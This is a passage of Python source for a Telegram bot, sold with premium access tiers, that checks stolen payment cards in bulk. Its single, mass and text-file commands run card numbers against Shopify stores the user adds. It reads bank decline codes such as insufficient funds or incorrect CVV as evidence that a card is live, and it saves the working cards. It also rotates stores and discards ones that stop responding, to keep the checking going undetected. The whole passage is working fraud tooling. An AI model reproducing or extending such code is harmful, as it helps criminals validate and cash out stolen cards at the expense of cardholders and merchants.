        else: await event.reply("❌ 𝙉𝙤 𝙨𝙞𝙩𝙚𝙨 𝙬𝙚𝙧𝙚 𝙧𝙚𝙢𝙤𝙫𝙚𝙙!")
    except Exception as e: await event.reply(f"❌ 𝙀𝙧𝙧𝙤𝙧: {e}")

@client.on(events.NewMessage(pattern=r'(?i)^[/.]sh'))
async def sh(event):
    can_access, access_type = await can_use(event.sender_id, event.chat)
    if access_type == "banned": return await event.reply(banned_user_message())
    if not can_access:
        buttons = [[Button.url("𝙐𝙨𝙚 𝙄𝙣 𝙂𝙧𝙤𝙪𝙥 𝙁𝙧𝙚𝙚", f"https://t.me/+VI845oiGrL4xMzE0")]]
        return await event.reply("🚫 𝙐𝙣𝙖𝙪𝙩𝙝𝙤𝙧𝙞𝙨𝙚𝙙 𝘼𝙘𝙘𝙚𝙨𝙨!\n\n𝙔𝙤𝙪 𝙘𝙖𝙣 𝙪𝙨𝙚 𝙩𝙝𝙞𝙨 𝙗𝙤𝙩 𝙞𝙣 𝙜𝙧𝙤𝙪𝙥 𝙛𝙤𝙧 𝙛𝙧𝙚𝙚!\n\n𝙁𝙤𝙧 𝙥𝙧𝙞𝙫𝙖𝙩𝙚 𝙖𝙘𝙘𝙚𝙨𝙨, 𝙘𝙤𝙣𝙩𝙖𝙘𝙩 @𝙈𝙤𝙙_𝘽𝙮_𝙆𝙖𝙢𝙖𝙡", buttons=buttons)
    asyncio.create_task(process_sh_card(event, access_type))

async def process_sh_card(event, access_type):
    card = None
    if event.reply_to_msg_id:
        replied_msg = await event.get_reply_message()
        if replied_msg and replied_msg.text: card = extract_card(replied_msg.text)
        if not card: return await event.reply("⚠️ **Wrong Format!**\n\n**Command:** `/sh card|mm|yy|cvv`\n**Example:** `/sh 4111111111111111|12|2025|123`\n\n🔥 Reply to card info to check instantly.")
    else:
        card = extract_card(event.raw_text)
        if not card: return await event.reply("⚠️ **Wrong Format!**\n\n**Command:** `/sh card|mm|yy|cvv`\n**Example:** `/sh 4111111111111111|12|2025|123`\n\n🔥 Reply to card info to check instantly.")
    
    sites = await load_json(SITE_FILE)
    user_sites = sites.get(str(event.sender_id), [])
    if not user_sites: return await event.reply("⚠️ **No Sites Added!**\n\nAdd Shopify sites using `/add <site>`")
    
    # Get username
    user = await event.get_sender()
    username_tg = user.first_name if user.first_name else "User"
    
    # Live progress animation
    loading_msg = await event.reply(f"""⍟━━━⌁ **CHECKING** ⌁━━━⍟

[🝂] **CARD** ⌁ {card[:6]}●●●●●●{card[-4:]}
[🝂] **GATE** ⌁ Shopify Self Charge
[🝂] **RESPONSE** ⌁ Checking ■□□□

[🝂] **CHECKED BY** ➺ {username_tg} [PREMIUM]""")
    
    start_time = time.time()
    
    # Update progress
    await asyncio.sleep(0.5)
    try:
        await loading_msg.edit(f"""⍟━━━⌁ **CHECKING** ⌁━━━⍟

[🝂] **CARD** ⌁ {card[:6]}●●●●●●{card[-4:]}
[🝂] **GATE** ⌁ Shopify Self Charge
[🝂] **RESPONSE** ⌁ Checking ■■□□

[🝂] **CHECKED BY** ➺ {username_tg} [PREMIUM]""")
    except: pass
    
    try:
        res, site_index = await check_card_random_site(card, user_sites)
        elapsed_time = round(time.time() - start_time, 2)
        brand, bin_type, level, bank, country, flag = await get_bin_info(card.split("|")[0])
        response_text = res.get("Response", "").lower()
        
        if "cloudflare bypass failed" in response_text:
            msg = f"""⍟━━━⌁ **ERROR** ⌁━━━⍟

[🝂] **CARD** ⌁ {card}
[🝂] **STATUS** ⌁ Error ⚠️
[🝂] **GATE** ⌁ Shopify Self Charge
[🝂] **RESPONSE** ⌁ Cloudflare spotted 🤡 change site

━━━━━━━━━━━━━━━━━
[🝂] **PRICE** ⌁ {res.get('Price')} 💸
[🝂] **SITE** ⌁ #{site_index}
━━━━━━━━━━━━━━━━━

[🝂] **TIME** ⌁ {elapsed_time}s
[🝂] **CHECKED BY** ➺ {username_tg} [PREMIUM]"""
        elif "thank you" in response_text or "payment successful" in response_text:
            await save_approved_card(card, "CHARGED (SH)", res.get('Response'), res.get('Gateway'), res.get('Price'))
            msg = f"""⍟━━━⌁ **CHARGED** ⌁━━━⍟

[🝂] **CARD** ⌁ {card}
[🝂] **STATUS** ⌁ Charged 💎
[🝂] **GATE** ⌁ Shopify Self Charge
[🝂] **RESPONSE** ⌁ {res.get('Response')}

━━━━━━━━━━━━━━━━━
[🝂] **INFO** ⌁ {brand} - {bin_type} - {level}
[🝂] **BANK** ⌁ {bank}
[🝂] **COUNTRY** ⌁ {country} {flag}
━━━━━━━━━━━━━━━━━
[🝂] **GATEWAY** ⌁ {res.get('Gateway', 'Unknown')}
[🝂] **PRICE** ⌁ {res.get('Price')} 💸
[🝂] **SITE** ⌁ #{site_index}
━━━━━━━━━━━━━━━━━

[🝂] **TIME** ⌁ {elapsed_time}s
[🝂] **CHECKED BY** ➺ {username_tg} [PREMIUM]"""
        elif any(key in response_text for key in ["invalid_cvv", "incorrect_cvv", "insufficient_funds", "approved", "success", "invalid_cvc", "incorrect_cvc", "incorrect_zip", "insufficient funds"]):
            await save_approved_card(card, "APPROVED (SH)", res.get('Response'), res.get('Gateway'), res.get('Price'))
            msg = f"""⍟━━━⌁ **APPROVED** ⌁━━━⍟

[🝂] **CARD** ⌁ {card}
[🝂] **STATUS** ⌁ Approved ✅
[🝂] **GATE** ⌁ Shopify Self Charge
[🝂] **RESPONSE** ⌁ {res.get('Response')}

━━━━━━━━━━━━━━━━━
[🝂] **INFO** ⌁ {brand} - {bin_type} - {level}
[🝂] **BANK** ⌁ {bank}
[🝂] **COUNTRY** ⌁ {country} {flag}
━━━━━━━━━━━━━━━━━
[🝂] **GATEWAY** ⌁ {res.get('Gateway', 'Unknown')}
[🝂] **PRICE** ⌁ {res.get('Price')} 💸
[🝂] **SITE** ⌁ #{site_index}
━━━━━━━━━━━━━━━━━

[🝂] **TIME** ⌁ {elapsed_time}s
[🝂] **CHECKED BY** ➺ {username_tg} [PREMIUM]"""
        else:
            msg = f"""⍟━━━⌁ **DECLINED** ⌁━━━⍟

[🝂] **CARD** ⌁ {card}
[🝂] **STATUS** ⌁ Declined ❌
[🝂] **GATE** ⌁ Shopify Self Charge
[🝂] **RESPONSE** ⌁ {res.get('Response')}

━━━━━━━━━━━━━━━━━
[🝂] **INFO** ⌁ {brand} - {bin_type} - {level}
[🝂] **BANK** ⌁ {bank}
[🝂] **COUNTRY** ⌁ {country} {flag}
━━━━━━━━━━━━━━━━━
[🝂] **GATEWAY** ⌁ {res.get('Gateway', 'Unknown')}
[🝂] **PRICE** ⌁ {res.get('Price')} 💸
[🝂] **SITE** ⌁ #{site_index}
━━━━━━━━━━━━━━━━━

[🝂] **TIME** ⌁ {elapsed_time}s
[🝂] **CHECKED BY** ➺ {username_tg} [PREMIUM]"""
        
        await loading_msg.delete()
        result_msg = await event.reply(msg)
        if "thank you" in response_text or "payment successful" in response_text: 
            await pin_charged_message(event, result_msg)
    except Exception as e:
        await loading_msg.delete()
        await event.reply(f"❌ **Error:** {e}")

@client.on(events.NewMessage(pattern=r'(?i)^[/.]msh'))
async def msh(event):
    can_access, access_type = await can_use(event.sender_id, event.chat)
    if access_type == "banned": return await event.reply(banned_user_message())
    if not can_access:
        buttons = [[Button.url("𝙐𝙨𝙚 𝙄𝙣 𝙂𝙧𝙤𝙪𝙥 𝙁𝙧𝙚𝙚", f"https://t.me/+VI845oiGrL4xMzE0")]]
        return await event.reply("🚫 𝙐𝙣𝙖𝙪𝙩𝙝𝙤𝙧𝙞𝙨𝙚𝙙 𝘼𝙘𝙘𝙚𝙨𝙨!\n\n𝙔𝙤𝙪 𝙘𝙖𝙣 𝙪𝙨𝙚 𝙩𝙝𝙞𝙨 𝙗𝙤𝙩 𝙞𝙣 𝙜𝙧𝙤𝙪𝙥 𝙛𝙤𝙧 𝙛𝙧𝙚𝙚!\n\n𝙁𝙤𝙧 𝙥𝙧𝙞𝙫𝙖𝙩𝙚 𝙖𝙘𝙘𝙚𝙨𝙨, 𝙘𝙤𝙣𝙩𝙖𝙘𝙩 @𝙈𝙤𝙙_𝘽𝙮_𝙆𝙖𝙢𝙖𝙡", buttons=buttons)
    cards = []
    if event.reply_to_msg_id:
        replied_msg = await event.get_reply_message()
        if replied_msg and replied_msg.text: cards = extract_all_cards(replied_msg.text)
        if not cards: return await event.reply("𝘾𝙤𝙪𝙡𝙙𝙣'𝙩 𝙚𝙭𝙩𝙧𝙖𝙘𝙩 𝙫𝙖𝙡𝙞𝙙 𝙘𝙖𝙧𝙙𝙨 𝙛𝙧𝙤𝙢 𝙧𝙚𝙥𝙡𝙞𝙚𝙙 𝙢𝙚𝙨𝙨𝙖𝙜𝙚\n\n𝙁𝙤𝙧𝙢𝙚𝙩. /𝙢𝙨𝙝 4111111111111111|12|2025|123 4111111111111111|12|2025|123")
    else:
        cards = extract_all_cards(event.raw_text)
        if not cards: return await event.reply("𝙁𝙤𝙧𝙢𝙚𝙩. /𝙢𝙨𝙝 4111111111111111|12|2025|123 4111111111111111|12|2025|123 4111111111111111|12|2025|123\n\n𝙊𝙧 𝙧𝙚𝙥𝙡𝙮 𝙩𝙤 𝙖 𝙢𝙚𝙨𝙨𝙖𝙜𝙚 𝙘𝙤𝙣𝙩𝙖𝙞𝙣𝙞𝙣𝙜 𝙢𝙪𝙡𝙩𝙞𝙥𝙡𝙚 𝙘𝙖𝙧𝙙𝙨")
    if len(cards) > 500:
        original_count = len(cards)
        cards = cards[:500]
        await event.reply(f"⚠️ **Limit Reached!**\n\n📊 Processing first **500** cards out of **{original_count}** provided.\n🔥 Max limit: **500 cards**")
    sites = await load_json(SITE_FILE)
    user_sites = sites.get(str(event.sender_id), [])
    if not user_sites: return await event.reply("𝙔𝙤𝙪𝙧 𝘼𝙧𝙚𝙚 𝙣𝙤𝙩 𝘼𝙙𝙙𝙚𝙙 𝘼𝙣𝙮 𝙐𝙧𝙡 𝙁𝙞𝙧𝙨𝙩 𝘼𝙙𝙙 𝙐𝙧𝙡")
    asyncio.create_task(process_msh_cards(event, cards, user_sites))

async def process_msh_cards(event, cards, sites):
    sent_msg = await event.reply(f"🛒 **MASS SHOPIFY CHECK INITIATED**\n\n⚡ Processing {len(cards)} cards...\n🔥 Shopify Gateway Active...")
    
    cards_per_site = 2
    current_site_index = 0
    cards_on_current_site = 0
    
    approved_count = 0
    charged_count = 0
    declined_count = 0
    all_results = []
    approved_cards = []

    batch_size = 10
    for i in range(0, len(cards), batch_size):
        batch = cards[i:i+batch_size]
        tasks = []

        for card in batch:
            current_site = sites[current_site_index]
            tasks.append(check_card_specific_site(card, current_site))
            cards_on_current_site += 1
            if cards_on_current_site >= cards_per_site:
                current_site_index = (current_site_index + 1) % len(sites)
                cards_on_current_site = 0

        results = await asyncio.gather(*tasks, return_exceptions=True)

        for j, (card, result) in enumerate(zip(batch, results)):
            if isinstance(result, Exception):
                result = {"Response": f"Exception: {str(result)}", "Price": "-", "Gateway": "-"}

            brand, bin_type, level, bank, country, flag = await get_bin_info(card.split("|")[0])
            response_text = result.get("Response", "").lower()
            
            if "cloudflare bypass failed" in response_text:
                declined_count += 1
                all_results.append(f"{card}|Cloudflare Spotted\n{brand} - {bin_type} - {level}\n{bank}\n{country} {flag}")
            elif "thank you" in response_text or "payment successful" in response_text:
                charged_count += 1
                await save_approved_card(card, "CHARGED", result.get('Response'), result.get('Gateway'), result.get('Price'))
                all_results.append(f"{card}|{result.get('Response')}\n{brand} - {bin_type} - {level}\n{bank}\n{country} {flag}")
                approved_cards.append((card, result, brand, bin_type, level, bank, country, flag, "CHARGED"))
            elif any(key in response_text for key in ["invalid_cvv", "incorrect_cvv", "insufficient_funds", "approved", "success", "invalid_cvc", "incorrect_cvc", "incorrect_zip", "insufficient funds"]):
                approved_count += 1
                await save_approved_card(card, "APPROVED", result.get('Response'), result.get('Gateway'), result.get('Price'))
                all_results.append(f"{card}|{result.get('Response')}\n{brand} - {bin_type} - {level}\n{bank}\n{country} {flag}")
                approved_cards.append((card, result, brand, bin_type, level, bank, country, flag, "APPROVED"))
            else:
                declined_count += 1
                all_results.append(f"{card}|{result.get('Response')}\n{brand} - {bin_type} - {level}\n{bank}\n{country} {flag}")

    # Create ONE message with all cards like Momo Ayase
    cards_text = "\n\n".join(all_results)
    summary = f"""Mass_Results ({len(cards)} cards)
Gate: Shopify Self
Stats: 💎 {charged_count} | ✅ {approved_count} | ❌ {declined_count}
Time: {len(cards) * 5}s

{cards_text}"""
    
    await sent_msg.edit(f"```{summary}```")
    
    # Also send APPROVED/CHARGED cards individually with full details
    for card, result, brand, bin_type, level, bank, country, flag, status in approved_cards:
        status_emoji = "💎" if status == "CHARGED" else "✅"
        approved_msg = f"""{status} {status_emoji}

Card: {card}
Status: {result.get('Response')}
Gateway: {result.get('Gateway', 'Shopify')}
Price: {result.get('Price')} 💸

Information:
├ Card Type: {brand} - {bin_type} - {level}
├ Bank: {bank}
├ Country: {country} {flag}

Time Taken ➜ 5.2s"""
        result_msg = await event.reply(approved_msg)
        if status == "CHARGED":
            await pin_charged_message(event, result_msg)

@client.on(events.NewMessage(pattern=r'(?i)^[/.]mtxt$'))
async def mtxt(event):
    can_access, access_type = await can_use(event.sender_id, event.chat)
    if access_type == "banned": return await event.reply(banned_user_message())
    if not can_access:
        buttons = [[Button.url("𝙐𝙨𝙚 𝙄𝙣 𝙂𝙧𝙤𝙪𝙥 𝙁𝙧𝙚𝙚", f"https://t.me/+VI845oiGrL4xMzE0")]]
        return await event.reply("🚫 𝙐𝙣𝙖𝙪𝙩𝙝𝙤𝙧𝙞𝙨𝙚𝙙 𝘼𝙘𝙘𝙚𝙨𝙨!\n\n𝙔𝙤𝙪 𝙘𝙖𝙣 𝙪𝙨𝙚 𝙩𝙝𝙞𝙨 𝙗𝙤𝙩 𝙞𝙣 𝙜𝙧𝙤𝙪𝙥 𝙛𝙤𝙧 𝙛𝙧𝙚𝙚!\n\n𝙁𝙤𝙧 𝙥𝙧𝙞𝙫𝙖𝙩𝙚 𝙖𝙘𝙘𝙚𝙨𝙨, 𝙘𝙤𝙣𝙩𝙖𝙘𝙩 @𝙈𝙤𝙙_𝘽𝙮_𝙆𝙖𝙢𝙖𝙡", buttons=buttons)
    user_id = event.sender_id
    if user_id in ACTIVE_MTXT_PROCESSES: return await event.reply("```𝙔𝙤𝙪𝙧 𝘾𝘾 is 𝙖𝙡𝙧𝙚𝙖𝙙𝙮 𝘾𝙤𝙤𝙠𝙞𝙣𝙜 🍳 𝙬𝙖𝙞𝙩 𝙛𝙤𝙧 𝙘𝙤𝙢𝙥𝙡𝙚𝙩𝙚```")
    try:
        if not event.reply_to_msg_id: return await event.reply("```𝙋𝙡𝙚𝙖𝙨𝙚 𝙧𝙚𝙥𝙡𝙮 𝙩𝙤 𝙖 𝙙𝙤𝙘𝙪𝙢𝙚𝙣𝙩 𝙢𝙚𝙨𝙨𝙖𝙜𝙚 𝙬𝙞𝙩𝙝 /𝙢𝙩𝙭𝙩```")
        replied_msg = await event.get_reply_message()
        if not replied_msg or not replied_msg.document: return await event.reply("```𝙋𝙡𝙚𝙖𝙨𝙚 𝙧𝙚𝙥𝙡𝙮 𝙩𝙤 𝙖 𝙙𝙤𝙘𝙪𝙢𝙚𝙣𝙩 𝙢𝙚𝙨𝙨𝙖𝙜𝙚 𝙬𝙞𝙩𝙝 /𝙢𝙩𝙭𝙩```")
        file_path = await replied_msg.download_media()
        try:
            async with aiofiles.open(file_path, "r") as f: lines = (await f.read()).splitlines()
            os.remove(file_path)
        except Exception as e:
            try: os.remove(file_path)
            except: pass
            return await event.reply(f"❌ 𝙀𝙧𝙧𝙤𝙧 𝙧𝙚𝙖𝙙𝙞𝙣𝙜 𝙛𝙞𝙡𝙚: {e}")
        cards = [line for line in lines if re.match(r'\d{12,16}\|\d{1,2}\|\d{2,4}\|\d{3,4}', line)]
        if not cards: return await event.reply("𝘼𝙣𝙮 𝙑𝙖𝙡𝙞𝙙 𝘾𝘾 𝙣𝙤𝙩 𝙁𝙤𝙪𝙣𝙙 🥲")
        cc_limit = get_cc_limit(access_type, user_id)
        total_cards_found = len(cards)
        if len(cards) > cc_limit:
            cards = cards[:cc_limit]
            await event.reply(f"""```📝 𝙁𝙤𝙪𝙣𝙙 {total_cards_found} 𝘾𝘾𝙨 𝙞𝙣 𝙛𝙞𝙡𝙚
⚠️ 𝙋𝙧𝙤𝙘𝙚𝙨𝙨𝙞𝙣𝙜 𝙤𝙣𝙡𝙮 𝙛𝙞𝙧𝙨𝙩 {cc_limit} 𝘾𝘾𝙨 (𝙮𝙤𝙪𝙧 𝙡𝙞𝙢𝙞𝙩)
🔥 {len(cards)} 𝘾𝘾𝙨 𝙬𝙞𝙡𝙡 𝙗𝙚 𝙘𝙝𝙚𝙘𝙠𝙚𝙙```""")
        else: await event.reply(f"""```📝 𝙁𝙤𝙪𝙣𝙙 {total_cards_found} 𝙫𝙖𝙡𝙞𝙙 𝘾𝘾𝙨 𝙞𝙣 𝙛𝙞𝙡𝙚
🔥 𝘼𝙡𝙡 {len(cards)} 𝘾𝘾𝙨 𝙬𝙞𝙡𝙡 𝙗𝙚 𝙘𝙝𝙚𝙘𝙠𝙚𝙙```""")
        sites = await load_json(SITE_FILE)
        user_sites = sites.get(str(event.sender_id), [])
        if not user_sites: return await event.reply("𝙎𝙞𝙩𝙚 𝙉𝙤𝙩 𝙁𝙤𝙪𝙣𝙙 𝙄𝙣 𝙔𝙤𝙪𝙧 𝘿𝙗")
        ACTIVE_MTXT_PROCESSES[user_id] = True
        asyncio.create_task(process_mtxt_cards(event, cards, user_sites.copy()))
    except Exception as e:
        ACTIVE_MTXT_PROCESSES.pop(user_id, None)
        await event.reply(f"❌ 𝙀𝙧𝙧𝙤𝙧: {e}")

async def process_mtxt_cards(event, cards, local_sites):
    user_id = event.sender_id
    total = len(cards)
    checked, approved, charged, declined = 0, 0, 0, 0
    status_msg = await event.reply(f"```𝙎𝙤మె𝙩𝙝𝙞𝙣𝙜 𝘽𝙞𝙜 𝘾𝙤𝙤𝙠𝙞𝙣𝙜 🍳```")
    cards_per_site = 4
    current_site_index = 0
    cards_on_current_site = 0

    try:
        batch_size = 15
        for i in range(0, len(cards), batch_size):
            if not local_sites:
                await status_msg.edit("❌ **All your sites are dead!**\nPlease add fresh sites using `/add` and try again.")
                break

            batch = cards[i:i+batch_size]
            tasks = []
            task_cards = []

            if user_id not in ACTIVE_MTXT_PROCESSES:
                final_caption = f"""⛔ 𝘾𝙝𝙚𝙘𝙠𝙞𝙣𝙜 𝙎𝙩𝙤𝙥𝙥𝙚𝙙!
𝙏𝙤𝙩𝙖𝙡 𝘾𝙃𝘼𝙍𝙂𝙀 💎 : {charged}
𝙏𝙤𝙩𝙖𝙡 𝘼𝙥𝙥𝙧𝙤𝙫𝙚 🔥 : {approved}
𝙏𝙤𝙩𝙖𝙡 𝘿𝙚𝙘𝙡𝙞𝙣𝙚 ❌ : {declined}
𝙏𝙤𝙩𝙖𝙡 𝘾𝙝𝙚𝙘𝙠𝙚𝙙 ☠️ : {checked}/{total}
"""
                final_buttons = [[Button.inline(f"𝘾𝙃𝘼𝙍𝙂𝙀 ➜ [ {charged} ] 💎", b"none")], [Button.inline(f"𝘼𝙥𝙥𝙧𝙤𝙫𝙚 ➜ [ {approved} ] 🔥", b"none")], [Button.inline(f"𝙎𝙩𝙤𝙥 ➜ [{checked}/{total}] ⛔", b"none")]]
                try: await status_msg.edit(final_caption, buttons=final_buttons)
                except: pass
                return

            for card in batch:
                if user_id not in ACTIVE_MTXT_PROCESSES or not local_sites:
                    break
                current_site = local_sites[current_site_index]
                tasks.append(check_card_specific_site(card, current_site))
                task_cards.append((card, current_site_index))
                cards_on_current_site += 1
                if cards_on_current_site >= cards_per_site:
                    current_site_index = (current_site_index + 1) % len(local_sites)
                    cards_on_current_site = 0
            
            if not tasks: continue

            results = await asyncio.gather(*tasks, return_exceptions=True)

            for j, (result, (card, site_index)) in enumerate(zip(results, task_cards)):
                if user_id not in ACTIVE_MTXT_PROCESSES: break

                if isinstance(result, Exception):
                    result = {"Response": f"Exception: {str(result)}", "Price": "-", "Gateway": "-"}

                checked += 1
                start_time = time.time()
                end_time = time.time()
                elapsed_time = round(end_time - start_time, 2)
                
                response_text = result.get("Response", "")
                response_text_lower = response_text.lower()
                
                site_used = local_sites[site_index]

                if is_site_dead(response_text):
                    declined += 1
                    if site_used in local_sites:
                        local_sites.remove(site_used)
                        all_sites_data = await load_json(SITE_FILE)
                        if str(user_id) in all_sites_data and site_used in all_sites_data[str(user_id)]:
                            all_sites_data[str(user_id)].remove(site_used)
                            await save_json(SITE_FILE, all_sites_data)
                        current_site_index = 0
                        cards_on_current_site = 0
                    
                    # Check if all sites are now dead
                    if not local_sites:
                        final_caption = f"""⛔ **All sites are dead!**
Please add fresh sites using `/add` and try again.

𝙏𝙤𝙩𝙖𝙡 𝘾𝙃𝘼𝙍𝙂𝙀 💎 : {charged}
𝙏𝙤𝙩𝙖𝙡 𝘼𝙥𝙥𝙧𝙤𝙫𝙚 🔥 : {approved}
𝙏𝙤𝙩𝙖𝙡 𝘿𝙚𝙘𝙡𝙞𝙣𝙚 ❌ : {declined}
𝙏𝙤𝙩𝙖𝙡 𝘾𝙝𝙚𝙘𝙠𝙚𝙙 ☠️ : {checked}/{total}
"""
                        final_buttons = [[Button.inline(f"𝘾𝙃𝘼𝙍𝙂𝙀 ➜ [ {charged} ] 💎", b"none")], [Button.inline(f"𝘼𝙥𝙥𝙧𝙤𝙫𝙚 ➜ [ {approved} ] 🔥", b"none")], [Button.inline(f"𝘿𝙚𝙖𝙙 𝙎𝙞𝙩𝙚𝙨! ➜ [{checked}/{total}] ⛔", b"none")]]
                        try: await status_msg.edit(final_caption, buttons=final_buttons)
                        except: pass
                        ACTIVE_MTXT_PROCESSES.pop(user_id, None)
                        return
                    continue

                if "3d" in response_text_lower:
                    declined += 1
                    continue

                brand, bin_type, level, bank, country, flag = await get_bin_info(card.split("|")[0])
                should_send_message = False

                if "cloudflare bypass failed" in response_text_lower:
                    status_header = "𝘾𝙇𝙊𝙐𝘿𝙁𝙇𝘼𝙍𝙀 𝙎𝙋𝙊𝙏𝙏𝙀𝘿 ⚠️"
                    result["Response"] = "Cloudflare spotted 🤡 change site or try again"
                    checked -= 1
                elif "thank you" in response_text_lower or "payment successful" in response_text_lower:
                    charged += 1
                    status_header = "𝘾𝙃𝘼𝙍𝙂𝙀𝘿 💎"
                    await save_approved_card(card, "CHARGED", result.get('Response'), result.get('Gateway'), result.get('Price'))
                    should_send_message = True
                elif any(key in response_text_lower for key in ["invalid_cvv", "incorrect_cvv", "insufficient_funds", "approved", "success", "invalid_cvc", "incorrect_cvc", "incorrect_zip", "insufficient funds"]):
                    approved += 1
                    status_header = "𝘼𝙋𝙋𝙍𝙊𝙑𝙀𝘿 ✅"
                    await save_approved_card(card, "APPROVED", result.get('Response'), result.get('Gateway'), result.get('Price'))
                    should_send_message = True
                else:
                    declined += 1
                    status_header = "~~ 𝘿𝙀𝘾𝙇𝙄𝙉𝙀𝘿 ~~ ❌"

                if should_send_message:
                    card_msg = f"""{status_header}

𝗖𝗖 ⇾ `{card}`
𝗚𝗮𝘁𝗲𝙬𝙖𝙮 ⇾ {result.get('Gateway', 'Unknown')}
𝗥𝗲𝙨𝙥𝙤𝙣𝙨𝙚 ⇾ {result.get('Response')}
𝗣𝗿𝗶𝗰𝗲 ⇾ {result.get('Price')} 💸
𝗦𝗶𝘁𝗲 ⇾ {site_index + 1}

```𝗕𝗜𝗡 𝗜𝗻𝗳𝗼: {brand} - {bin_type} - {level}
𝗕𝗮𝗻𝗸: {bank}
𝗖𝗼𝘂𝗻𝘁𝗿𝘆: {country} {flag}```

𝗧𝗼𝗼𝙠 {elapsed_time} 𝘀𝗲𝗰𝗼𝗻𝗱𝙨
"""
                    result_msg = await event.reply(card_msg)
                    if "thank you" in response_text_lower or "payment successful" in response_text_lower: await pin_charged_message(event, result_msg)
                
                buttons = [[Button.inline(f"𝗖𝘂𝗿𝗿𝗲𝗻𝘁 ➜ {card[:12]}****", b"none")], [Button.inline(f"𝙎𝙩𝙖𝙩𝙪𝙨 ➜ {result.get('Response')[:25]}...", b"none")], [Button.inline(f"𝗦𝗶𝘁𝗲 ➜ {site_index + 1}", b"none")], [Button.inline(f"𝘾𝙃𝘼𝙍𝙂𝙀 ➜ [ {charged} ] 💎", b"none")], [Button.inline(f"𝘼𝙥𝙥𝙧𝙤𝙫𝙚 ➜ [ {approved} ] 🔥", b"none")], [Button.inline(f"𝘿𝙚𝙘𝙡𝙞𝙣𝙚 ➜ [ {declined} ] ❌", b"none")], [Button.inline(f"𝙋𝙧𝙤𝙜𝙧𝙚𝙨𝙨 ➜ [{checked}/{total}] ✅", b"none")], [Button.inline("⛔ 𝙎𝙩𝙤𝙥", f"stop_mtxt:{user_id}".encode())]]
                try: await status_msg.edit("```𝘾𝙤𝙤𝙠𝙞𝙣𝙜 🍳 𝘾𝘾𝙨 𝙊𝙣𝙚 𝙗𝙮 𝙊𝙣𝙚...```", buttons=buttons)
                except: pass
                await asyncio.sleep(0.1)

        final_caption = f"""✅ 𝘾𝙝𝙚𝙘𝙠𝙞𝙣𝙜 𝘾𝙤𝙢𝙥𝙡𝙚𝙩𝙚!
𝙏𝙤𝙩𝙖𝙡 𝘾𝙃𝘼𝙍𝙂𝙀 💎 : {charged}
𝙏𝙤𝙩𝙖𝙡 𝘼𝙥𝙥𝙧𝙤𝙫𝙚 🔥 : {approved}
𝙏𝙤𝙩𝙖𝙡 𝘿𝙚𝙘𝙡𝙞𝙣𝙚 ❌ : {declined}
𝙏𝙤𝙩𝙖𝙡 𝘾𝙝𝙚𝙘𝙠𝙚𝙙 ☠️ : {total}
"""
        final_buttons = [[Button.inline(f"𝘾𝙃𝘼𝙍𝙂𝙀 ➜ [ {charged} ] 💎", b"none")], [Button.inline(f"𝘼𝙥𝙥𝙧𝙤𝙫𝙚 ➜ [ {approved} ] 🔥", b"none")], [Button.inline(f"𝙏𝙤𝙩𝙖𝙡 ➜ [{total}] ☠️", b"none")], [Button.inline(f"𝙏𝙤𝙩𝙖𝙡 𝘾𝙝𝙚𝙘𝙠𝙚𝙙 ➜ [{checked}/{total}] ✅", b"none")]]
        try: await status_msg.edit(final_caption, buttons=final_buttons)
        except: pass
    finally: ACTIVE_MTXT_PROCESSES.pop(user_id, None)


@client.on(events.CallbackQuery(pattern=rb"stop_mtxt:(\d+)"))
async def stop_mtxt_callback(event):
    try:
        match = event.pattern_match
        process_user_id = int(match.group(1).decode())
        clicking_user_id = event.sender_id
        can_stop = False
        if clicking_user_id == process_user_id: can_stop = True
        elif clicking_user_id in ADMIN_ID: can_stop = True
        if not can_stop: return await event.answer("```❌ 𝙔𝙤𝙪 𝙘𝙖𝙣 𝙤𝙣𝙡𝙮 𝙨𝙩𝙤𝙥 𝙮𝙤𝙪𝙧 𝙤𝙬𝙣 𝙥𝙧𝙤𝙘𝙚𝙨𝙨!```", alert=True)
        if process_user_id not in ACTIVE_MTXT_PROCESSES: return await event.answer("```❌ 𝙉𝙤 𝙖𝙘𝙩𝙞𝙫𝙚 𝙥𝙧𝙤𝙘𝙚𝙨𝙨 𝙛𝙤𝙪𝙣𝙙!```", alert=True)
        ACTIVE_MTXT_PROCESSES.pop(process_user_id, None)
        await event.answer("```⛔ 𝘾𝘾 𝙘𝙝𝙚𝙘𝙠𝙞𝙣𝙜 𝙨𝙩𝙤𝙥𝙥𝙚𝙙!```", alert=True)
    except Exception as e: await event.answer(f"```❌ 𝙀𝙧𝙧𝙤𝙧: {str(e)}```", alert=True)

@client.on(events.NewMessage(pattern='/info'))
async def info(event):
    if await is_banned_user(event.sender_id): return await event.reply(banned_user_message())
    user = await event.get_sender()
    user_id = event.sender_id
    first_name = user.first_name or "𝙉/𝘼"
    last_name = user.last_name or ""
    full_name = f"{first_name} {last_name}".strip()
    username = f"@{user.username}" if user.username else "𝙉/𝘼"
    has_premium = await is_premium_user(user_id)
    premium_status = "✅ 𝙋𝙧𝙚𝙢𝙞𝙪𝙢 𝘼𝙘𝙘𝙚𝙨𝙨" if has_premium else "❌ 𝙉𝙤 𝙋𝙧𝙚𝙢𝙞𝙪𝙢 𝘼𝙘𝙘𝙚𝙨𝙨"
    sites = await load_json(SITE_FILE)
    user_sites = sites.get(str(user_id), [])
    if user_sites: sites_text = "\n".join([f"{idx + 1}. {site}" for idx, site in enumerate(user_sites)])
    else: sites_text = "𝙉𝙤 𝙨𝙞𝙩𝙚𝙨 𝙖𝙙𝙙𝙚𝙙"
    info_text = f"""👤 𝙐𝙨𝙚𝙧 𝙄𝙣𝙛𝙤𝙧𝙢𝙖𝙩𝙞𝙤𝙣

𝙉𝙖𝙢𝙚 ⇾ {full_name}
𝙐𝙨𝙚𝙧𝙣𝙖𝙢𝙚 ⇾ {username}
𝙐𝙨𝙚𝙧 𝙄𝘿 ⇾ `{user_id}`
𝙋𝙧  𝙞𝙫𝙖𝙩𝙚 𝘼𝙘𝙘𝙚𝙨𝙨 ⇾ {premium_status}

𝙎𝙞𝙩𝙚𝙨 ⇾ ({len(user_sites)}):

```
{sites_text}

```
"""

    await event.reply(info_text)

@client.on(events.NewMessage(pattern='/stats'))
async def stats(event):
    if event.sender_id not in ADMIN_ID:
        return await event.reply("🚫 𝙊𝙣𝙡𝙮 𝘼𝙙𝙢𝙞𝙣 𝘾𝙖𝙣 𝙐𝙨𝙚 𝙏𝙝𝙞𝙨 𝘾𝙤𝙢𝙢𝙖𝙣𝙙!")

    try:
        premium_users = await load_json(PREMIUM_FILE)
        free_users = await load_json(FREE_FILE)
        user_sites = await load_json(SITE_FILE)
        keys_data = await load_json(KEYS_FILE)

